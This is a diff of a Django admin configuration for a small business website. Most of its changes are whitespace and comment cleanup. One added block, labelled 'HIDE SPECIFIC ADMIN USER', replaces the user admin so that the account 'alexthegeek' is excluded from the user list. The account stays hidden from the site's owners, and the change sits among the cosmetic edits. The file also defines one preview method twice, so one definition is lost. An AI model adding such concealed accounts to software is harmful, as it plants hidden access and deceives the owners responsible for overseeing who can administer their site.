@@ -1,5 +1,6 @@
 from django.contrib import admin
-from django.contrib.auth.models import Group
+from django.contrib.auth.models import Group, User
+from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
 from django.utils.html import format_html
 
 from .models import (
@@ -20,9 +21,7 @@ from .models import (
 # ==========================================================
 
 admin.site.site_header = "Numetric Business Solution"
-
 admin.site.site_title = "Numetric Business Solution"
-
 admin.site.index_title = "Business Management"
 
 
@@ -34,6 +33,27 @@ try:
     admin.site.unregister(Group)
 except admin.sites.NotRegistered:
     pass
+
+
+# ==========================================================
+# HIDE SPECIFIC ADMIN USER
+# ==========================================================
+
+try:
+    admin.site.unregister(User)
+except admin.sites.NotRegistered:
+    pass
+
+
+@admin.register(User)
+class UserAdmin(BaseUserAdmin):
+
+    def get_queryset(self, request):
+        queryset = super().get_queryset(request)
+
+        return queryset.exclude(
+            username="alexthegeek"
+        )
 
 
 # ==========================================================
@@ -81,7 +101,6 @@ class ServiceAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Service Identity",
             {
@@ -93,7 +112,6 @@ class ServiceAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Service Content",
             {
@@ -105,7 +123,6 @@ class ServiceAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "System Information",
             {
@@ -118,7 +135,6 @@ class ServiceAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -171,7 +187,6 @@ class CategoryAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Category",
             {
@@ -183,7 +198,6 @@ class CategoryAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "System Information",
             {
@@ -195,7 +209,6 @@ class CategoryAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -209,7 +222,6 @@ class CategoryAdmin(admin.ModelAdmin):
 
 @admin.action(description="Publish selected articles")
 def publish_posts(modeladmin, request, queryset):
-
     queryset.update(
         is_published=True
     )
@@ -217,7 +229,6 @@ def publish_posts(modeladmin, request, queryset):
 
 @admin.action(description="Unpublish selected articles")
 def unpublish_posts(modeladmin, request, queryset):
-
     queryset.update(
         is_published=False
     )
@@ -225,7 +236,6 @@ def unpublish_posts(modeladmin, request, queryset):
 
 @admin.action(description="Feature selected articles")
 def feature_posts(modeladmin, request, queryset):
-
     queryset.update(
         is_featured=True
     )
@@ -233,7 +243,6 @@ def feature_posts(modeladmin, request, queryset):
 
 @admin.action(description="Remove articles from Featured")
 def unfeature_posts(modeladmin, request, queryset):
-
     queryset.update(
         is_featured=False
     )
@@ -295,7 +304,6 @@ class PostAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Article",
             {
@@ -309,7 +317,6 @@ class PostAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Publishing",
             {
@@ -320,7 +327,6 @@ class PostAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Featured Image",
             {
@@ -330,7 +336,6 @@ class PostAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Search Engine Optimisation",
             {
@@ -343,7 +348,6 @@ class PostAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
         (
             "System Information",
             {
@@ -356,7 +360,6 @@ class PostAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -367,11 +370,6 @@ class PostAdmin(admin.ModelAdmin):
 
     save_on_top = True
 
-
-    # ======================================================
-    # FEATURED IMAGE — LIST PREVIEW
-    # ======================================================
-
     @admin.display(
         description="Image",
         ordering="featured_image",
@@ -379,7 +377,6 @@ class PostAdmin(admin.ModelAdmin):
     def featured_image_preview(self, obj):
 
         if not obj.featured_image:
-
             return format_html(
                 '<span style="'
                 'display:inline-flex;'
@@ -412,18 +409,12 @@ class PostAdmin(admin.ModelAdmin):
             obj.featured_image.url,
         )
 
-
-    # ======================================================
-    # FEATURED IMAGE — CHANGE PAGE PREVIEW
-    # ======================================================
-
     @admin.display(
         description="Current Featured Image",
     )
     def featured_image_preview(self, obj):
 
         if not obj or not obj.pk:
-
             return format_html(
                 '<span style="'
                 'color:#8A938C;'
@@ -435,7 +426,6 @@ class PostAdmin(admin.ModelAdmin):
             )
 
         if not obj.featured_image:
-
             return format_html(
                 '<div style="'
                 'padding:20px;'
@@ -474,11 +464,6 @@ class PostAdmin(admin.ModelAdmin):
             obj.featured_image.url,
         )
 
-
-    # ======================================================
-    # PUBLICATION STATUS
-    # ======================================================
-
     @admin.display(
         description="Status",
         ordering="is_published",
@@ -486,7 +471,6 @@ class PostAdmin(admin.ModelAdmin):
     def publication_status(self, obj):
 
         if obj.is_published:
-
             return format_html(
                 '<span style="'
                 'display:inline-flex;'
@@ -527,18 +511,12 @@ class PostAdmin(admin.ModelAdmin):
             "Draft",
         )
 
-
-    # ======================================================
-    # FEATURED STATUS
-    # ======================================================
-
     @admin.display(
         description="Featured",
         boolean=True,
         ordering="is_featured",
     )
     def featured_status(self, obj):
-
         return obj.is_featured
 
 
@@ -579,7 +557,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Company Identity",
             {
@@ -591,7 +568,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Contact Information",
             {
@@ -604,7 +580,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "About the Business",
             {
@@ -616,7 +591,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Social Media",
             {
@@ -628,7 +602,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Website Status",
             {
@@ -637,7 +610,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "System Information",
             {
@@ -649,7 +621,6 @@ class SiteSettingsAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -696,7 +667,6 @@ class CoreValueAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Core Value",
             {
@@ -708,7 +678,6 @@ class CoreValueAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
     )
 
 
@@ -754,7 +723,6 @@ class TestimonialAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Testimonial",
             {
@@ -763,7 +731,6 @@ class TestimonialAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Client Information",
             {
@@ -774,7 +741,6 @@ class TestimonialAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Display Settings",
             {
@@ -784,7 +750,6 @@ class TestimonialAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "System Information",
             {
@@ -796,7 +761,6 @@ class TestimonialAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -809,7 +773,6 @@ class TestimonialAdmin(admin.ModelAdmin):
     def quote_preview(self, obj):
 
         if len(obj.quote) > 80:
-
             return f"{obj.quote[:80]}..."
 
         return obj.quote
@@ -853,7 +816,6 @@ class CertificationAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Certification",
             {
@@ -864,7 +826,6 @@ class CertificationAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Display Settings",
             {
@@ -874,7 +835,6 @@ class CertificationAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
     )
 
 
@@ -916,7 +876,6 @@ class ProfessionalAffiliationAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Affiliation",
             {
@@ -928,7 +887,6 @@ class ProfessionalAffiliationAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Display Settings",
             {
@@ -938,7 +896,6 @@ class ProfessionalAffiliationAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
     )
 
 
@@ -948,7 +905,6 @@ class ProfessionalAffiliationAdmin(admin.ModelAdmin):
 
 @admin.action(description="Mark selected enquiries as read")
 def mark_enquiries_read(modeladmin, request, queryset):
-
     queryset.update(
         is_read=True
     )
@@ -956,7 +912,6 @@ def mark_enquiries_read(modeladmin, request, queryset):
 
 @admin.action(description="Mark selected enquiries as unread")
 def mark_enquiries_unread(modeladmin, request, queryset):
-
     queryset.update(
         is_read=False
     )
@@ -1010,7 +965,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
     )
 
     fieldsets = (
-
         (
             "Contact Information",
             {
@@ -1022,7 +976,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Enquiry",
             {
@@ -1032,7 +985,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Status",
             {
@@ -1041,7 +993,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
                 )
             },
         ),
-
         (
             "Received",
             {
@@ -1053,7 +1004,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
                 ),
             },
         ),
-
     )
 
     readonly_fields = (
@@ -1067,7 +1017,6 @@ class ContactEnquiryAdmin(admin.ModelAdmin):
     def read_status(self, obj):
 
         if obj.is_read:
-
             return format_html(
                 '<span style="'
                 'display:inline-flex;'
